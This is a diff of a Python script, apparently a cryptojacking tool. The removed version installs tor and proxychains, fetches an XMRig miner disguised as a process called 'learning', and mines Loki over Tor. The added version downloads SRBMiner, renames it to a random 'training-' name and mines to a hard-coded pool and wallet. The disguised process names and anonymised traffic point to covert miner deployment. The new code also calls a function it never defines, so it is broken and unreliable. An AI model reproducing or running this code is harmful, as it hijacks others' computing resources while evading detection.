@@ -1,36 +1,61 @@
-__author__ = 'root'
-import time
-import os, sys
-import multiprocessing
+import subprocess
+import secrets
+import shutil
+import os
+from pathlib import Path
 
-useproxy = 0
-os.system('chmod 777 ' + __file__)
-program = 'learning'
-os.system('pkill ' + program)
-cores = multiprocessing.cpu_count() - 1
-if cores <= 0:
-    cores = 1
-os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
+# Constants
+VERSION = "2.7.2"
+WORK_DIR = Path.home() / "work"
+SRBMiner_DIR = WORK_DIR / f"SRBMiner-Multi-{VERSION}"
+POOL = "stratum+tcp://pool.apepepow.fairhash.org:5666"
+USERNAME = "PTupQHcGmCNURChN7ModtqkQfpHq1MUBaD"
+ALGO = "memehash_apepepow"
+#DONATE = "1"
+def create_work_dir():
+    WORK_DIR.mkdir(parents=True, exist_ok=True)
 
-try:
-    os.system('apt-get update -y')
-    os.system('apt-get install -y gcc make tor python3 python3-dev')
-    os.system('rm -rf proxychains-ng')
-    os.system('git clone https://github.com/ts6aud5vkg/proxychains-ng.git')
-    os.chdir('proxychains-ng')
-    os.system('make')
-    os.system('make install')
-    os.system('make install-config')
-    if not os.path.isfile('/usr/local/bin/' + program):
-        os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
-        os.system('chmod 777 ' + program)
-        workingdir = os.getcwd()
-        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/local/bin/' + program)
-        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
-        time.sleep(2)
-except:
-    pass
+    url = f"https://github.com/doktor83/SRBMiner-Multi/releases/download/v{VERSION}/SRBMiner-Multi-{VERSION}-Linux.tar.gz"
+    try:
+        subprocess.run(["wget", url, "-P", str(WORK_DIR)], shell=False, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error downloading SRBMiner: {e}")
+        return False
+    return True
 
-os.system('tor &')
-time.sleep(60)
-os.system('proxychains4 ' + program + ' --donate-level 1 -o loki.herominers.com:10114 -u LDFKUgMc5zudMEYdNJoxrHVtckxfLuS3GQRVEGoYa1saNirBrBR1xbG9idbGZoS6ieFDz371dgfynAxzYbn1zoQa5UafGzn -p x -a rx/loki -k --tls -t ' + str(cores))
+def extract_SRBMiner():
+    try:
+        subprocess.run(["tar", "-xvzf", str(WORK_DIR / f"SRBMiner-Multi-{VERSION}-Linux.tar.gz"), "-C", str(WORK_DIR)], shell=False, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error extracting SRBMiner: {e}")
+        return False
+    return True
+
+def rename_SRBMiner():
+    SRBMiner_path = SRBMiner_DIR / "SRBMiner"
+    random_name = f"training-{secrets.randbelow(375)}-{secrets.randbelow(259)}"
+    shutil.move(str(SRBMiner_path), str(WORK_DIR / random_name))
+    return WORK_DIR / random_name
+
+def set_permissions(SRBMiner_path):
+    os.chmod(str(SRBMiner_path), 0o755)
+
+def run_SRBMiner(SRBMiner_path):
+    SRBMiner_cmd = [
+        str(SRBMiner_path),
+        "-o", POOL,
+        "-u", USERNAME,
+        "-a", ALGO,
+        "-k", "--tls"
+    ]
+    try:
+        subprocess.run(SRBMiner_cmd, shell=False, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error running SRBMiner: {e}")
+
+if __name__ == "__main__":
+    create_work_dir()
+    if download_SRBMiner() and extract_SRBMiner():
+        SRBMiner_path = rename_SRBMiner()
+        set_permissions(SRBMiner_path)
+        run_SRBMiner(SRBMiner_path)
